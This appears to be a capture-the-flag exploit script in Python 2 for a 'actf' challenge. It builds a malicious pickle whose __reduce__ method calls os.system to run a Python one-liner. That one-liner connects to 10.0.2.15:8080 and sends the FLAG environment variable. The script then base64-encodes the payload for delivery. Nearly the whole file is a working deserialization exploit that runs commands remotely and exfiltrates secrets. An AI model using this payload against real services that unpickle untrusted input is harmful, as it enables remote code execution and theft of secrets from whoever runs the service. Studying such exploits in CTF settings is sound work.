import os
flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')
'''
import pickle
import base64
byte = base64.b64decode('gASVKgAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5SMDXJtIHBpY2tsZS5qcGeUhZRSlC4=')
print(byte)
tmp = pickle.loads(byte)
print(tmp.student)
'''
import pickle
import os
import urllib
import base64
pp = 'python -c '
scr = ''''import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.2.15", 8080));import os;s.send("HERE{}".format(os.environ.get("FLAG")));data = s.recv(1024)' '''
print pp+scr
class genpoc(object):
    def __reduce__(self):
        def sol():
            return os.environ.get("FLAG")
        return os.system, (pp+scr,) 

e = genpoc()
poc = pickle.dumps(e)

print(poc)
print(base64.b64encode(poc)) 
print(pickle.loads(base64.b64decode(base64.b64encode(poc))))
